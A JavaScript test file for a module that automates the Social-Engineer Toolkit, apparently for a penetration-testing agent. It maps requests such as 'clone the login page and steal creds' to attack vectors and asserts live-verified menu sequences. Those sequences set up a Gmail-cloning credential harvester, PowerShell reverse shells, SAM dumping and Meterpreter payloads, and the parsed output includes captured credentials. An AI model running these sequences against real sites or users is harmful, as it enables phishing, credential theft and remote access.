// Phase 14 (SET — Social-Engineer Toolkit) tests — vector selection, exact menu-answer SEQUENCES (verified
// live against setoolkit), command bash-validity, and artifact/credential parsing. Run: node scripts/test-set.mjs
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { SET_MENU, SET_PAYLOADS, SET_POWERSHELL, renderSetMenu, pickSetVector, buildSetSequence, buildSetCommand, parseSet } from '../src/services/set/index.js';

let pass = 0, fail = 0;
const ok = (n, c, e = '') => { if (c) { pass++; console.log(`  ✅ ${n}`); } else { fail++; console.log(`  ❌ ${n} ${e}`); } };
const bashOk = (cmd) => { if (!cmd) return true; const f = path.join(os.tmpdir(), `set_${Math.random().toString(36).slice(2)}.sh`); fs.writeFileSync(f, cmd); const r = spawnSync('bash', ['-n', f], { encoding: 'utf8' }); fs.rmSync(f, { force: true }); return r.status === 0; };

console.log('\n[1] menu + vector matching');
ok('menu lists >=12 attacks', SET_MENU.length >= 12 && /QRCode/.test(renderSetMenu()) && /Credential Harvester/.test(renderSetMenu()));
ok('9 SET payload types', Object.keys(SET_PAYLOADS).length === 9 && /Meterpreter/.test(SET_PAYLOADS[2]));
ok('4 powershell vectors', Object.keys(SET_POWERSHELL).length === 4 && /SAM/.test(SET_POWERSHELL[4]));
ok('pick by number', pickSetVector('1')?.vector === 'qrcode' && pickSetVector('3')?.vector === 'harvester');
ok('pick "qr code"', pickSetVector('generate a qr code')?.vector === 'qrcode');
ok('pick "clone the login page" -> harvester', pickSetVector('clone the login page and steal creds')?.vector === 'harvester');
ok('pick "powershell reverse shell"', pickSetVector('powershell reverse shell')?.vector === 'powershell-reverse');
ok('pick "dump sam"', pickSetVector('powershell dump the sam')?.vector === 'powershell-sam');
ok('pick "payload"', pickSetVector('make me a windows meterpreter payload')?.vector === 'payload');
ok('unknown -> null', pickSetVector('order a pizza') === null);

console.log('\n[2] EXACT menu-answer sequences (verified live against setoolkit)');
ok('QR = y,1,8,<url>,enter,99,99 (LIVE-PROVEN)', buildSetSequence('qrcode', { url: 'https://x.com' }).seq === 'y\n1\n8\nhttps://x.com\n\n99\n99\n');
ok('payload = y,1,4,2,<lhost>,<lport>,no (LIVE-PROVEN)', buildSetSequence('payload', { lhost: '10.0.0.5', lport: 4444 }).seq === 'y\n1\n4\n2\n10.0.0.5\n4444\nno\n');
ok('harvester site-cloner = y,1,2,3,2,<lhost>,<url>', buildSetSequence('harvester', { lhost: '10.0.0.5', url: 'https://gmail.com' }).seq === 'y\n1\n2\n3\n2\n10.0.0.5\nhttps://gmail.com\n');
ok('web-jacking = y,1,2,5,2', buildSetSequence('webjacking', { lhost: '10.0.0.5', url: 'https://x' }).seq.startsWith('y\n1\n2\n5\n2\n'));
ok('tabnabbing = y,1,2,4,2', buildSetSequence('tabnabbing', { lhost: '10.0.0.5', url: 'https://x' }).seq.startsWith('y\n1\n2\n4\n2\n'));
ok('powershell reverse = y,1,9,2', buildSetSequence('powershell-reverse', { lhost: '10.0.0.5', lport: 4444 }).seq.startsWith('y\n1\n9\n2\n'));
ok('powershell bind = y,1,9,3', buildSetSequence('powershell-bind', { lport: 4444 }).seq.startsWith('y\n1\n9\n3\n'));
ok('powershell alpha = y,1,9,1', buildSetSequence('powershell-alpha', { lhost: '10.0.0.5', lport: 4444 }).seq.startsWith('y\n1\n9\n1\n'));
ok('powershell sam = y,1,9,4', buildSetSequence('powershell-sam', {}).seq.startsWith('y\n1\n9\n4\n'));
ok('payload type keyword (https -> 7)', buildSetSequence('payload', { lhost: '1.2.3.4', payloadType: 7 }).seq.includes('\n4\n7\n'));

console.log('\n[3] listener vs one-shot + bash validity of every vector command');
ok('harvester = LIVE listener (persistent job)', buildSetCommand('harvester', { lhost: '10.0.0.5', url: 'https://x' }).listener === true);
ok('webjacking/tabnabbing = listeners', buildSetCommand('webjacking', { lhost: '1', url: 'x' }).listener && buildSetCommand('tabnabbing', { lhost: '1', url: 'x' }).listener);
ok('qrcode/payload/powershell = one-shot (not listener)', !buildSetCommand('qrcode', { url: 'x' }).listener && !buildSetCommand('payload', { lhost: '1', lport: 2 }).listener);
ok('wifi/massmailer = infoOnly (no command)', buildSetCommand('wifi', {}).infoOnly && buildSetCommand('massmailer', {}).infoOnly && buildSetCommand('wifi', {}).command === null);
for (const v of ['qrcode', 'payload', 'harvester', 'webjacking', 'tabnabbing', 'powershell-reverse', 'powershell-bind', 'powershell-alpha', 'powershell-sam', 'infectious', 'massmailer', 'wifi']) {
  ok(`${v}: valid bash`, bashOk(buildSetCommand(v, { lhost: '10.0.0.5', lport: 4444, url: 'https://x.com' }).command));
}
ok('one-shot command collects artifacts + disables auto-update + KILL timeout', (() => { const c = buildSetCommand('qrcode', { url: 'x' }).command; return /AUTO_UPDATE=OFF/.test(c) && /timeout -s KILL/.test(c) && /SET-ARTIFACT/.test(c) && /TERM=xterm/.test(c); })());
ok('no stray backticks in any command (shell-safe)', ['qrcode', 'payload', 'harvester', 'powershell-sam'].every((v) => !/`/.test(buildSetCommand(v, { lhost: '1', lport: 2, url: 'x' }).command || '')));

console.log('\n[4] parseSet -> findings (from the REAL proof output shapes)');
const arts = parseSet('setoolkit', 'SET-ARTIFACT: 7168 bytes  /root/.set/payload.exe\nSET-ARTIFACT: 787 bytes  /root/.set/reports/qrcode_attack.png\nSET-ARTIFACT: 1450 bytes  /root/.set/reports/powershell/x86_powershell_injection.txt');
ok('payload.exe -> high finding', arts.some((x) => /executable payload/.test(x.title) && x.severity === 'high'));
ok('qrcode.png -> high finding', arts.some((x) => /malicious QR code/.test(x.title)));
ok('powershell -> high finding', arts.some((x) => /Powershell payload/.test(x.title)));
ok('harvester live -> high access finding', parseSet('setoolkit', 'Credential Harvester is running on port 80').some((x) => /harvester.*LIVE/i.test(x.title) && x.severity === 'high'));
ok('captured cred -> critical', parseSet('setoolkit', 'POSSIBLE USERNAME FIELD FOUND: email=victim@corp.com').some((x) => x.severity === 'critical' && /Credential captured/.test(x.title)));
ok('non-SET output -> []', parseSet('nmap x', 'Meterpreter session opened').length === 0);

console.log(`\n${fail === 0 ? '🎉 ALL PASS' : '💥 FAILURES'} — ${pass} passed, ${fail} failed`);
process.exit(fail === 0 ? 0 : 1);
